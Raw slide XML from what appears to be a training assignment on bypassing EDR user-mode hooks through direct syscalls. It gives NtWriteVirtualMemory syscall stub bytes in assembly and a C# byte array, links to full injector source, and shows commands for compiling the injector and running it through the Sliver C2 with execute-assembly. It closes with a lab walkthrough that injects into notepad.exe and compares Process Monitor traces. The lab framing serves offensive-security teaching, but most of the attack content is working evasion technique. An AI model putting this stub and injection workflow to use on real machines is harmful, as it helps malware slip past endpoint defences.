            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="17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1: Define the Syscall Stub Bytes</a:t>
            </a:r>
            <a:endPar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For </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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NtWriteVirtualMemory</a:t>
            </a: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the stub is:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="17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asm</a:t>
            </a:r>
            <a:endPar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mov r10, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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rcx</a:t>
            </a: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first argument goes to r10</a:t>
            </a:r>
          </a:p>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mov </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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eax</a:t>
            </a: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SSN    ; System Service Number (e.g., 0x3A)</a:t>
            </a:r>
          </a:p>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syscall</a:t>
            </a:r>
          </a:p>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ret</a:t>
            </a:r>
          </a:p>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Byte representation (replace 0x3A with your actual SSN):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="41437644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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="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byte[] stub = new byte[] {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="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0x4C, 0x8B, 0xD1,          // mov r10, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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rcx</a:t>
            </a:r>
            <a:endPar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0xB8, 0x3A, 0x00, 0x00, 0x00, // mov </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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eax</a:t>
            </a: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SSN</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="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0x0F, 0x05,                // syscall</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="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0xC3                       // ret</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="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p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="17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2: Full C# Payload for execute-assembly</a:t>
            </a:r>
            <a:endPar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indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId2">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>https://github.com/umarniazafrid/Week-11-Task-3-Part-2-Step-2-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1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3: Compile and Execute via C2</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Compile on your Kali machine (or Windows with Visual Studio):</a:t>
            </a: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csc /</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target:exe</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out:SyscallInjector.exe</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SyscallInjector.cs</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Upload and run via Sliver execute-assembly:</a:t>
            </a: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upload /path/to/SyscallInjector.exe C:\temp\</a:t>
            </a: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execute-assembly C:\temp\SyscallInjector.exe</a:t>
            </a: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p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28946880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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="85000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1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4: Why This Bypasses EDR Hooks</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Standard API call:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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YourCode</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ntdll!NtWriteVirtualMemory</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(hooked by EDR with JMP) → EDR check → syscall</a:t>
            </a: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Direct syscall stub (your code):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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YourCode</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YourStub</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(mov </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eax</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SSN; syscall) → Kernel</a:t>
            </a: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The EDR hook at the start of </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ntdll!NtWriteVirtualMemory</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is never executed because the stub bypasses the function prologue entirely.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1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5: Verification</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On the target Windows VM:</a:t>
            </a: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1. Run API Monitor or Process Monitor.</a:t>
            </a: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2. Filter by your process name.</a:t>
            </a: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3. Run the standard API injector – you will see calls to ntdll.dll with EDR hooks.</a:t>
            </a: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4. Run the syscall injector – you will see the syscall executing directly from your allocated memory region, bypassing </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ntdll</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entirely.</a:t>
            </a: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 Compare the stack traces – the syscall version does not show any </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ntdll</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function calls.</a:t>
            </a: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p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1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6: Important Notes</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lvl="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buNone/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>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The stub is generated at runtime in memory and never written to disk.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buNone/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>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Replace the SSN (0x3A) with the correct value extracted from Part 1 (</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Syswhispers</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or Hell's Gate).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buNone/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>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You can extend this to any syscall by changing the stub bytes and delegate signature.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buNone/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>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This bypasses EDR user‑mode hooks without touching the kernel or loading drivers.</a:t>
            </a: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p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1615318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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1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Task 03 Part 3: Verification – Standard API vs Direct Syscall</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indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1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What This Verification Proves</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You will run two separate process injections into notepad.exe:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>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Standard API injection – uses CreateRemoteThread (calls hooked </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ntdll</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functions)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>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Direct syscall injection – uses your custom syscall stub (bypasses </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ntdll</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hooks)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="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Then capture a Process Monitor or API Monitor trace to prove the syscall executes directly without </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="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calling the hooked </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ntdll</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functions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="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p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1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1: Prepare the Test Environment</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Open notepad.exe on the target Windows VM:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="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notepad.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="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Note the PID of notepad.exe (e.g., 1234).</a:t>
            </a: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p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1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2: Standard API Injection (Baseline – Triggers EDR)</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indent="0">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Create a C# payload </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thatses</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standard Windows APIs:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://github.com/umarniazafrid/Week-11-Task-3-Part-3-step-2/tree/main</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10549586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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Compile and execute via C2:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>csc /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>target:exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>out:StandardInjector.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>StandardInjector.cs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>upload /path/to/StandardInjector.exe C:\temp\</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>execute-assembly C:\temp\StandardInjector.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="17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3: Direct Syscall Injection (Bypasses EDR)</a:t>
            </a:r>
            <a:endPar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indent="0">
              <a:lnSpc>
                <a:spcPct val="100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Create a C# payload that uses your syscall stub from Part 2: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId2">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr xmlns:ahyp="http://schemas.microsoft.com/office/drawing/2018/hyperlinkcolor" val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>https://github.com/umarniazafrid/Week-11-Task-3-Part-3-step-3/tree/main</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>   </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="30000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </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Compile and execute via C2:</a:t>
            </a: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csc /</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target:exe</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out:SyscallInjector.exe</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SyscallInjector.cs</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upload /path/to/SyscallInjector.exe C:\temp\</a:t>
            </a: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execute-assembly C:\temp\SyscallInjector.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1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4: Capture Process Monitor Trace (Standard API)</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Run Process Monitor on the target Windows VM:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="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procmon.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="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Apply filters to isolate the injection:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="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Process Name is notepad.exe (include)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="200194941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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="40000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="15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Operation is WriteProcessMemory (include)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="40000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="15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Operation is CreateRemoteThread (include)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="40000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="15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Operation is VirtualAllocEx (include)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="40000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="15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Path contains ntdll.dll (include)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="40000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="15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Run the StandardInjector.exe through your C2.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="15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In Process Monitor, observe the call stack:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="15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You will see:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="15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notepad.exe → CreateRemoteThread → ntdll.dll!NtCreateThreadEx (hooked by EDR) → syscall</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="15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The call stack will show ntdll.dll functions with EDR hooks present.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="50000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="15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Take a screenshot showing the standard API call triggering the EDR.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
